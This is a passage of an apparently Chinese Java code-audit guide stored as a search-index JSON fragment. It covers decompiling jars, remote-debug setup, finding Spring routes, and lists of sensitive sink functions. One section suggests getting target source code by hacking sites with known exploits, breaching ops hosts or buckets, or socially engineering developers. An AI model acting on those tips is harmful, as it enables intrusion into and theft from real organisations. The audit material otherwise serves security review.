\uff1a\u2f64\u4e8e\u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u73af\u5883\u53d8\u91cf\u7684\u2f45\u6cd5\u3002 System.getenv \uff1a\u2f64\u4e8e\u83b7\u53d6\u6307\u5b9a\u7cfb\u7edf\u73af\u5883\u53d8\u91cf\u7684\u2f45\u6cd5\u3002 System.setSecurityManager \uff1a\u2f64\u4e8e\u8bbe\u7f6e\u5f53\u524d\u7cfb\u7edf\u5b89\u5168\u7ba1\u7406\u5668\u7684\u2f45\u6cd5\u3002 System.getSecurityManager \uff1a\u2f64\u4e8e\u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u5b89\u5168\u7ba1\u7406\u5668\u7684\u2f45\u6cd5\u3002 System.lineSeparator \uff1a\u2f64\u4e8e\u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6362\u2f8f\u7b26\u7684\u5c5e\u6027\u3002 System.in \uff1a\u2f64\u4e8e\u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6807\u51c6\u8f93\u2f0a\u6d41\u7684\u5c5e\u6027\u3002 System.out \uff1a\u2f64\u4e8e\u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6807\u51c6\u8f93\u51fa\u6d41\u7684\u5c5e\u6027\u3002 System.err \uff1a\u2f64\u4e8e\u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6807\u51c6\u9519\u8bef\u6d41\u7684\u5c5e\u6027\u3002 System.gc \uff1a\u2f64\u4e8e\u8bf7\u6c42\u7cfb\u7edf\u8fdb\u2f8f\u5783\u573e\u56de\u6536\u7684\u2f45\u6cd5\u3002 System.runFinalization \uff1a\u2f64\u4e8e\u8bf7\u6c42\u7cfb\u7edf\u8fd0\u2f8f\u6302\u8d77\u7684\u5bf9\u8c61\u7684 finalize \u2f45\u6cd5\u7684\u2f45\u6cd5 Java\u6e90\u7801\u5ba1\u8ba1\u6d89\u53ca\u7684\u7cfb\u7edf\u73af\u5883\u53d8\u91cf\u51fd\u6570\u5982\u4e0b\uff1a System.getenv() : \u83b7\u53d6\u7cfb\u7edf\u73af\u5883\u53d8\u91cf\u7684\u503c\uff0c\u4f8b\u5982 System.getenv(\"PATH\") \u53ef\u4ee5\u83b7\u53d6 PATH \u73af\u5883\u53d8\u91cf\u7684\u503c\u3002 System.getProperty() : \u83b7\u53d6 Java \u7cfb\u7edf\u5c5e\u6027\u7684\u503c\u3002 System.getProperty(\"user.home\") \u83b7\u53d6\u5f53\u524d\u2f64\u6237\u7684 home \u2f6c\u5f55\u8def\u5f84\u3002 Runtime.getRuntime().exec() : \u53ef\u4ee5\u6267\u2f8f\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u3002 ProcessBuilder.start() : \u540c\u4e0a \u8fd9\u4e9b\u51fd\u6570\u53ef\u80fd\u4f1a\u5bfc\u81f4\u547d\u4ee4\u6ce8\u2f0a\u6f0f\u6d1e\uff0c\u5982\u679c\u7a0b\u5e8f\u6ca1\u6709\u6b63\u786e\u8fc7\u6ee4\u8f93\u2f0a\u6570\u636e\u6216\u6ca1\u6709\u5bf9\u8f93\u51fa\u6570\u636e\u8fdb\u2f8f \u8f6c\u4e49\uff0c\u53ef\u80fd\u5bfc\u81f4\u547d\u4ee4\u6267\u2f8f\u3002 \u6d89\u53ca\u7c7b\u52a0\u8f7d\u5668\u51fd\u6570\u7684\u6f0f\u6d1e\u51fd\u6570\u5982\u4e0b\uff1a Class.forName() : \u901a\u8fc7\u7ed9\u5b9a\u7684\u7c7b\u540d\u52a0\u8f7d\u7c7b\u3002 ClassLoader.loadClass() : \u901a\u8fc7\u7ed9\u5b9a\u7684\u7c7b\u540d\u52a0\u8f7d\u7c7b\u3002 ClassLoader.defineClass() : \u901a\u8fc7\u7ed9\u5b9a\u7684\u5b57\u8282\u6570\u7ec4\u5b9a\u4e49\u2f00\u4e2a\u65b0\u7684\u7c7b\u3002 ClassLoader.findLoadedClass() : \u53ef\u4ee5\u68c0\u67e5\u6307\u5b9a\u7684\u7c7b\u662f\u5426\u5df2\u7ecf\u88ab\u52a0\u8f7d \u5b89\u5168\u7ba1\u7406\u5668\u6f0f\u6d1e\u51fd\u6570 SecurityManager.checkPermission() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u68c0\u67e5\u662f\u5426\u5141\u8bb8\u6267\u2f8f\u6307\u5b9a\u7684\u64cd\u4f5c\u3002 SecurityManager.checkRead() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u68c0\u67e5\u662f\u5426\u5141\u8bb8\u8bfb\u53d6\u6307\u5b9a\u7684\u2f42\u4ef6\u3002 SecurityManager.checkWrite() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u68c0\u67e5\u662f\u5426\u5141\u8bb8\u5199\u2f0a\u6307\u5b9a\u7684\u2f42\u4ef6\u3002 SecurityManager.checkAccept() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u68c0\u67e5\u662f\u5426\u5141\u8bb8\u63a5\u53d7\u6765\u2f83\u6307\u5b9a\u5730\u5740\u7684\u8fde\u63a5\u3002 SecurityManager.checkConnect() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u68c0\u67e5\u662f\u5426\u5141\u8bb8\u8fde\u63a5\u5230\u6307\u5b9a\u5730\u5740\u3002 SecurityManager.checkListen() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u68c0\u67e5\u662f\u5426\u5141\u8bb8\u5728\u6307\u5b9a\u7aef\u2f1d\u4e0a\u76d1\u542c\u8fde\u63a5 Java\u4e2d\u5173\u4e8e\u5185\u5b58\u7ba1\u7406\u51fd\u6570\u7684\u6f0f\u6d1e\u51fd\u6570\uff1a Runtime.getRuntime().exec() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u6267\u2f8f\u6307\u5b9a\u7684\u547d\u4ee4\u3002 System.load() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u52a0\u8f7d\u6307\u5b9a\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u3002 System.loadLibrary() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u52a0\u8f7d\u6307\u5b9a\u7684\u672c\u5730\u5e93\u3002 System.gc() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u5f3a\u5236\u89e6\u53d1\u5783\u573e\u56de\u6536\u3002 System.runFinalization() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u5f3a\u5236\u8c03\u2f64\u6240\u6709\u5bf9\u8c61\u7684 finalize \u2f45\u6cd5\u3002 java.lang.ref.WeakReference.get() : \u2f64\u4ee5\u83b7\u53d6\u5f31\u5f15\u2f64\u5bf9\u8c61\u7684\u503c\u3002 java.lang.ref.SoftReference.get() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u83b7\u53d6\u8f6f\u5f15\u2f64\u5bf9\u8c61\u7684\u503c\u3002 java.lang.ref.PhantomReference.get() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u83b7\u53d6\u5e7d\u7075\u5f15\u2f64\u5bf9\u8c61\u7684\u503c Java\u4e2d\u6d89\u53ca\u5bc6\u7801\u5b58\u50a8\u51fd\u6570\u7684\u6f0f\u6d1e\u51fd\u6570\uff1a MessageDigest.getInstance() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u6d88\u606f\u6458\u8981\u5bf9\u8c61\uff0c\u2f64\u4e8e\u5bf9\u5bc6\u7801\u8fdb\u2f8f\u54c8\u5e0c\u8fd0 \u7b97\u3002 PBEKeySpec.PBEKeySpec() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u57fa\u4e8e\u2f1d\u4ee4\u7684\u5bc6\u94a5\u6750\u6599\u3002 SecretKeyFactory.getInstance() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u5bc6\u94a5\u2f2f\u2f1a\u5bf9\u8c61\uff0c\u2f64\u4e8e\u2f63\u6210\u5bc6\u94a5\u3002 KeyStore.load() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u52a0\u8f7d\u5bc6\u94a5\u5e93\u3002\u5982\u679c\u53ef\u4ee5\u63a7\u5236\u8f93\u2f0a\u7684\u5bc6\u94a5\u5e93\u2f42\u4ef6\uff0c\u53ef\u80fd\u2f64\u6765\u52a0 \u8f7d\u6076\u610f\u5bc6\u94a5\u5e93\u3002 PasswordEncryptor.encrypt() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u5bf9\u5bc6\u7801\u8fdb\u2f8f\u52a0\u5bc6 Java\u4e2d\u6d89\u53ca\u52a0\u5bc6\u51fd\u6570\u7684\u6f0f\u6d1e\u51fd\u6570\uff1a Cipher.getInstance() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u52a0\u5bc6\u5bf9\u8c61\uff0c\u2f64\u4e8e\u5bf9\u6570\u636e\u8fdb\u2f8f\u52a0\u5bc6\u3002 KeyGenerator.getInstance() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u5bc6\u94a5\u2f63\u6210\u5668\u5bf9\u8c61\uff0c\u2f64\u4e8e\u2f63\u6210\u5bc6\u94a5\u3002 KeyFactory.getInstance() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u5bc6\u94a5\u2f2f\u2f1a\u5bf9\u8c61\uff0c\u2f64\u4e8e\u2f63\u6210\u5bc6\u94a5\u3002 Signature.getInstance() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u7b7e\u540d\u5bf9\u8c61\uff0c\u2f64\u4e8e\u5bf9\u6570\u636e\u8fdb\u2f8f\u7b7e\u540d\u3002 SecretKeyFactory.getInstance() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u5bc6\u94a5\u2f2f\u2f1a\u5bf9\u8c61\uff0c\u2f64\u4e8e\u2f63\u6210\u5bc6\u94a5\u3002 Mac.getInstance() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u6d88\u606f\u8ba4\u8bc1\u7801\uff08MAC\uff09\u5bf9\u8c61\uff0c\u2f64\u4e8e\u5bf9\u6570\u636e\u8fdb\u2f8f\u8ba4\u8bc1\u3002 KeyAgreement.getInstance() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u5bc6\u94a5\u534f\u8bae\u5bf9\u8c61\uff0c\u2f64\u4e8e\u534f\u5546\u5bc6\u94a5\u3002 KeyPairGenerator.getInstance() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u5bc6\u94a5\u5bf9\u2f63\u6210\u5668\u5bf9\u8c61\uff0c\u2f64\u4e8e\u2f63\u6210\u5bc6\u94a5 \u5bf9\u3002 KeyFactory.getInstance() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u5bc6\u94a5\u2f2f\u2f1a\u5bf9\u8c61\uff0c\u2f64\u4e8e\u2f63\u6210\u5bc6\u94a5\u3002 KeyManagerFactory.getInstance() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u5bc6\u94a5\u7ba1\u7406\u5668\u2f2f\u2f1a\u5bf9\u8c61\uff0c\u2f64\u4e8e\u2f63\u6210 \u5bc6\u94a5\u7ba1\u7406\u5668\u3002","title":"\u73af\u5883\u51c6\u5907\u4e0e\u601d\u8def"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/#_1","text":"","title":"\u73af\u5883\u51c6\u5907\u4e0e\u601d\u8def"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/#_2","text":"\u51c6\u5907\u6e90\u7801 jar\u53cd\u7f16\u8bd1\\&jar\u5bfc\u5165\u4f9d\u8d56 class\u53cd\u7f16\u8bd1 \u8fdc\u7a0b\u8c03\u8bd5 \u5feb\u6377\u952e\u63a8\u8350 \u4e0a\u624b\u601d\u8def \u5e38\u89c1\u654f\u611f\u51fd\u6570\u641c\u96c6","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/#_3","text":"\u5ba1\u8ba1\u4ee3\u7801\u80af\u5b9a\u5f97\u5148\u6709\u6e90\u7801\uff0c\u6e90\u7801\u90fd\u6ca1\u6709\u5ba1\u5bc4\u5427\u3002 \u6e90\u7801\u600e\u4e48\u6765\uff1f \u63d0\u53d6\u76ee\u6807\u7cfb\u7edf\u7279\u5f81\u53bbgithub\u7b49\u4ee3\u7801\u6258\u7ba1\u5e73\u53f0\uff0cgooglehacking\u641c\u4e00\u641c \u7528\u73b0\u6210\u7684\u6d1e\u53bb\u7f51\u4e0a\u6253\u4e2a\u7ad9\u4e0b\u6765\u6252\u6e90\u7801\uff08\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u6253\u4e0b\u8fd0\u7ef4\u673a\u627e\u5230\u6e90\u7801/\u6253\u4e0b\u5b58\u50a8\u6876\u627e\u5230\u6e90\u7801/\u6253\u4e0b\u65c1\u7ad9\u6216\u4e3b\u6218\u6252\u6e90\u7801\uff09 \u76ee\u5f55\u626b\u63cf\u53bb\u626b\u5907\u4efd\u6587\u4ef6\uff0c\u7eaf\u770b\u8fd0\u6c14 \u6dd8\u5b9d/\u54b8\u9c7c\uff08\u6700\u9760\u8c31 \u793e\u5de5\u5f00\u53d1\u4eba\u5458 \u5982\u679c\u76ee\u6807\u4f01\u4e1a\u6709gitlab\uff0c\u53ef\u4ee5\u8bd5\u8bd5\u65b0\u6ce8\u518c\u4e00\u4e2a\u7528\u6237\u80fd\u8fdb\u53bb\u62ff\u5230\u6e90\u7801\u4e0d py","title":"\u51c6\u5907\u6e90\u7801"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/#jarjar","text":"\u5f88\u591a\u65f6\u5019\u6211\u4eec\u62ff\u5230\u6e90\u7801\u4f1a\u53d1\u73b0\u6709\u5f88\u591ajar\u5305\uff0c\u8fd9\u4e9bjar\u5305\u6211\u4eec\u5f97\u53cd\u7f16\u8bd1\u4e00\u4e0b\u624d\u80fd\u7ee7\u7eed\u5ba1\u8ba1\u3002 \u867d\u7136idea\u5df2\u7ecf\u81ea\u5e26\u5bf9jar\u7684\u53cd\u7f16\u8bd1\uff0c\u4f46\u662fidea\u5927\u591a\u6570\u65f6\u5019\u4e0d\u4f1a\u5bf9jar\u91cc\u7684\u5185\u5bb9\u7f16\u5236\u7d22\u5f15\uff0c\u5bfc\u81f4\u6211\u4eec\u4e0d\u80fd\u5bf9jar\u5305\u91cc\u7684\u5185\u5bb9\u8fdb\u884c\u641c\u7d22\uff0c\u6240\u4ee5\u8fd9\u91cc\u5efa\u8bae\u662f\u81ea\u5df1\u53cd\u7f16\u8bd1\u4e00\u6b21\u6240\u6709jar\u5305\uff0c\u5e76\u653e\u5230\u4e00\u4e2a\u6587\u4ef6\u5939\u91cc\uff0c\u518d\u628a\u8fd9\u4e2a\u6587\u4ef6\u5939\u653e\u5230idea\u9879\u76ee\u6587\u4ef6\u91cc\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5728idea\u5bf9jar\u5305\u91cc\u53cd\u7f16\u8bd1\u51fa\u6765\u7684\u5185\u5bb9\u8fdb\u884c\u5168\u5c40\u641c\u7d22\u4e86\u3002 \u4e00\u952e\u5bfc\u51fa\u6587\u4ef6\u5939\u4e0b\u6240\u6709jar\u5305 find ./ -name \"*.jar\" -exec cp {} targetpath \\; targetpath \u76ee\u6807\u6587\u4ef6\u5939 \u53cd\u7f16\u8bd1\u8bf4\u5b8c\u4e86\uff0c\u53e6\u4e00\u6b65\u5f97\u628a\u5bfc\u51fa\u6765\u7684jar\u5305\u6dfb\u52a0\u5230idea\u7684\u4f9d\u8d56\u91cc\u9762\uff0c\u8fd9\u6837\u624d\u80fd\u5728jar\u5305\u91cc\u7684class\u6587\u4ef6\u4e2d\u4e0b\u65ad\u70b9\u8fdb\u884c\u8fdc\u7a0b\u8c03\u8bd5\uff1a\u9879\u76ee\u7ed3\u6784\u2192\u6a21\u5757\u2192\u4f9d\u8d56\uff0c\u7136\u540e\u628a\u5bfc\u51fa\u6765\u7684jar\u6587\u4ef6\u5939\u6dfb\u52a0\u8fdb\u4f9d\u8d56\u3002","title":"jar\u53cd\u7f16\u8bd1\\&amp;jar\u5bfc\u5165\u4f9d\u8d56"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/#class","text":"\u6e90\u7801\u6587\u4ef6\u91cc\u4e5f\u6709\u5f88\u591aclass\u6587\u4ef6\uff0c\u5982\u679c\u4e0d\u53cd\u7f16\u8bd1\uff0cidea\u7684\u5168\u5c40\u5b57\u7b26\u641c\u7d22\u5c31\u4e0d\u80fd\u8986\u76d6\u8fd9\u4e9b\u6587\u4ef6\uff0c\u5bf9\u6211\u4eec\u7684\u5ba1\u8ba1\u5927\u4e0d\u5229\u3002 \u4e00\u952e\u5bfc\u51fa\u6587\u4ef6\u5939\u4e0b\u6240\u6709jar\u5305 find ./ -name \"*.class\" -exec cp {} targetpath \\; targetpath \u76ee\u6807\u6587\u4ef6\u5939 \u7136\u540e\u7528\u5de5\u5177\u53cd\u7f16\u8bd1\uff0c\u8fd9\u91cc\u63a8\u8350jadx https://github.com/skylot/jadx","title":"class\u53cd\u7f16\u8bd1"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/#_4","text":"tomcat: https://blog.csdn.net/xlgen157387/article/details/50268457 // Linxu\u7cfb\u7edf: apach/bin/startup.sh\u5f00\u59cb\u5904\u4e2d\u589e\u52a0\u5982\u4e0b\u5185\u5bb9\uff1a declare -x CATALINA_OPTS=\"-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8081\" // Windows\u7cfb\u7edf: apach/bin/startup.bat\u5f00\u59cb\u5904\u4e2d\u589e\u52a0\u5982\u4e0b\u5185\u5bb9\uff1a SET CATALINA_OPTS=-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8081","title":"\u8fdc\u7a0b\u8c03\u8bd5"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/#_5","text":"ctrl+shift+f \u5168\u5c40\u6587\u4ef6\u5185\u5bb9\u641c\u7d22\uff0c\u4e00\u822c\u7528\u6765\u8ddf\u8e2a\u67d0\u4e2a\u65b9\u6cd5\u7684\u7528\u6cd5 ctrl+shift+o \u5168\u5c40\u641c\u7d22\uff0c\u4e00\u822c\u7528\u6765\u5b9a\u4f4d\u67d0\u4e2a\u7c7b","title":"\u5feb\u6377\u952e\u63a8\u8350"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/#_6","text":"\u5bf9\u4e8espringmvc\u800c\u8a00\uff1a 0.\u628ajsp\u540d\u5168\u90e8\u5bfc\u51fa\u6765\uff0c\u7136\u540e\u653eburp\u91cc\u7206\u7834\uff08\u524d\u53f0\u548c\u540e\u53f0\u90fd\u8bd5\u8bd5\uff09\uff0c\u770b\u54ea\u4e9bjsp\u662f\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u7684\uff0c\u5982\u679c\u6709\u80fd\u76f4\u63a5\u8bbf\u95ee\u7684\u5efa\u8bae\u5148\u91cd\u70b9\u5173\u6ce8\u5176\u5185\u5bb9\u3002 find ./ -name \"*.jsp\" -exec cp {} dir \\; 1.\u901a\u8fc7web.xml\u6765\u770b\u6709\u54ea\u4e9b\u8def\u7531\uff0c\u7136\u540e\u6328\u4e2a\u770b\u8def\u7531\u5bf9\u5e94\u7684servlet\u91cc\u7684dopost/doget\u65b9\u6cd5\u903b\u8f91\uff0c\u8bd5\u7740\u627e\u51fa\u6f0f\u6d1e\u70b9\u3002 2.\u6709\u4e9b\u65f6\u5019web.xml\u91cc\u8bb0\u5f55\u7684\u8def\u7531\u4e0d\u5168\uff0c\u9700\u8981\u81ea\u5df1\u624b\u52a8\u53bb\u627e\u3002\u8fd9\u91cc\u53ef\u4ee5\u8bd5\u7740\u5168\u5c40\u641c\u7d22 controller.xml\u6216springmvc.xml/spring-mvc.xml\uff08controller\u7684\u6620\u5c04\u914d\u7f6e\u6587\u4ef6\uff09\uff0c@RequestMapping(. )\uff08\u8def\u7531\u6620\u5c04\u6ce8\u91ca\uff09@Path(. *) (javax.ws.rs.Path\u6ce8\u89e3\uff0c\u4f5c\u7528\u548c@RequestMapping\u5b8c\u5168\u4e00\u6837) 3.\u8def\u7531\u592a\u591a\u4e86\uff0c\u4e00\u4e2a\u4e00\u4e2a\u5206\u6790\u5c31\u5f88\u9ebb\u70e6\u56f0\u96be\u4e86\u3002\u8fd9\u91cc\u63d0\u4f9b\u7684\u601d\u8def\u662f1\u20e3\ufe0f\u4ece\u654f\u611f\u51fd\u6570\u5165\u624b\uff0c\u5411\u4e0a\u67e5\u627e\u5176\u53c2\u6570\u662f\u5426\u7531\u53ef\u63a7\u53c2\u6570\u63a7\u52362\u20e3\ufe0f\u5148\u9ed1\u76d2\uff0c\u770b\u770b\u54ea\u91cc\u6709\u503c\u5f97\u5229\u7528\u7684\u70b9\uff0c\u518d\u770b\u8def\u75313\u20e3\ufe0f\u901a\u8fc7\u8def\u7531\u7c97\u7565\u5224\u65ad\u54ea\u4e9b\u662f\u6bd4\u8f83\u654f\u611f\u7684\uff08file\uff0cupload\uff0csystem\uff0clogin\u7b49\uff09\uff0c\u7136\u540e\u770b\u8def\u7531\u5bf9\u5e94\u903b\u8f91 \u5bf9\u4e8espringboot springboot\u6ca1\u6709\u4e00\u822cweb.xml\uff0c\u6240\u4ee5\u627e\u8def\u7531\u5f97\u9760\u5173\u952e\u5b57@RequestMapping\u6216\u4e0b\u9762\u7684\u5173\u952e\u5b57 @GetMapping @PostMapping @PutMapping @PatchMapping @DeleteMapping \u627econtroller\u9760\u5173\u952e\u5b57@Controller\u6216@RestController \u627efilter \uff1a @WebFilter","title":"\u4e0a\u624b\u601d\u8def"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/#_7","text":"rce GroovyShell.evaluate() Runtime.getRuntime().exec() ProcessBuilder().start() \u6216\u8be6\u89c1\u5176\u4ed6\u6587\u7ae0 \u6587\u4ef6\u4e0a\u4f20 ServletFileUpload() \u6587\u4ef6\u4e0a\u4f20\u7684\u6838\u5fc3\u7c7b FileItemStream() \u8bbf\u95ee\u4e0a\u4f20\u6587\u4ef6 MultipartFile() spirng\u91cc\u901a\u8fc7html\u8868\u5355\u63d0\u4ea4\u4e0a\u6765\u7684\u6587\u4ef6\u7edf\u7edf\u4e3aMultipartFile ssrf HttpURLConnection.getInputStream() \u7528\u4e8e\u8bfb\u53d6http\u8bf7\u6c42\u7684\u7ed3\u679c URLConnection.getInputStream() \u540c\u4e0a \u4e0a\u9762\u4e24\u4e2a\u4e5f\u53ef\u4ee5\u7528 url.openconnection() \u6765\u627e\uff0c\u8fd9\u4e2a\u4e1c\u897f\u8fd4\u56deURLConnection\u5bf9\u8c61 URL.openStream() \u548c\u4e0a\u9762\u7684openconnection\u5f88\u50cf\uff0c\u5dee\u4e0d\u591a\u662f\u4e00\u4e2a\u610f\u601d ImageIO.read() \u5f53\u4f20\u5165\u7684\u662furl\u65f6\uff0c\u4f1a\u5728\u65b9\u6cd5\u5185\u90e8\u8c03\u7528url.openstream HttpClents.execute() HttpClent.execute() \u53cd\u5e8f\u5217\u5316 readObject .fromXML( xstream\u53cd\u5e8f\u5217\u5316 \u6587\u4ef6\u8bfb\u53d6 new Scanner( Files.lines Files.readAllLines Files.readString( Files.readAllBytes new BufferedReader \u6587\u4ef6\u7c7b File \uff1a\u2f64\u4e8e\u8868\u793a\u2f42\u4ef6\u548c\u2f6c\u5f55\u3002 RandomAccessFile \uff1a\u2f64\u4e8e\u8bfb\u53d6\u548c\u5199\u2f0a\u2f42\u4ef6\u3002 FileInputStream \uff1a\u2f64\u4e8e\u8bfb\u53d6\u2f42\u4ef6\u7684\u539f\u59cb\u5b57\u8282\u6d41\u3002 FileOutputStream \uff1a\u2f64\u4e8e\u5199\u2f0a\u2f42\u4ef6\u7684\u539f\u59cb\u5b57\u8282\u6d41\u3002 FileReader \uff1a\u2f64\u4e8e\u8bfb\u53d6\u2f42\u4ef6\u7684\u5b57\u7b26\u6d41\u3002 FileWriter \uff1a\u2f64\u4e8e\u5199\u2f0a\u2f42\u4ef6\u7684\u5b57\u7b26\u6d41\u3002 BufferedReader \uff1a\u2f64\u4e8e\u8bfb\u53d6\u2f42\u4ef6\u7684\u7f13\u51b2\u5b57\u7b26\u6d41\u3002 BufferedWriter \uff1a\u2f64\u4e8e\u5199\u2f0a\u2f42\u4ef6\u7684\u7f13\u51b2\u5b57\u7b26\u6d41\u3002 Scanner \uff1a\u2f64\u4e8e\u4ece\u2f42\u4ef6\u4e2d\u8bfb\u53d6\u6570\u636e\u3002 File.createTempFile() \uff1a\u2f64\u4e8e\u521b\u5efa\u4e34\u65f6\u2f42\u4ef6\u3002 File.createNewFile() \uff1a\u2f64\u4e8e\u521b\u5efa\u65b0\u2f42\u4ef6\u3002 File.mkdir() \uff1a\u2f64\u4e8e\u521b\u5efa\u2f6c\u5f55\u3002 File.mkdirs() \uff1a\u2f64\u4e8e\u521b\u5efa\u2f6c\u5f55\u6811\u3002 File.delete() \uff1a\u2f64\u4e8e\u5220\u9664\u2f42\u4ef6\u3002 File.listFiles() \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f6c\u5f55\u4e0b\u7684\u2f42\u4ef6\u5217\u8868\u3002 File.setExecutable() \uff1a\u2f64\u4e8e\u8bbe\u7f6e\u2f42\u4ef6\u7684\u53ef\u6267\u2f8f File.canRead() \uff1a\u2f64\u4e8e\u68c0\u67e5\u2f42\u4ef6\u662f\u5426\u53ef\u8bfb\u3002 File.canWrite() \uff1a\u2f64\u4e8e\u68c0\u67e5\u2f42\u4ef6\u662f\u5426\u53ef\u5199\u3002 File.canExecute() \uff1a\u2f64\u4e8e\u68c0\u67e5\u2f42\u4ef6\u662f\u5426\u53ef\u6267\u2f8f\u3002 File.isDirectory() \uff1a\u2f64\u4e8e\u68c0\u67e5\u2f42\u4ef6\u662f\u5426\u662f\u2f6c\u5f55\u3002 File.isFile() \uff1a\u2f64\u4e8e\u68c0\u67e5\u2f42\u4ef6\u662f\u5426\u662f\u666e\u901a\u2f42\u4ef6\u3002 File.isHidden() \uff1a\u2f64\u4e8e\u68c0\u67e5\u2f42\u4ef6\u662f\u5426\u662f\u9690\u85cf\u2f42\u4ef6\u3002 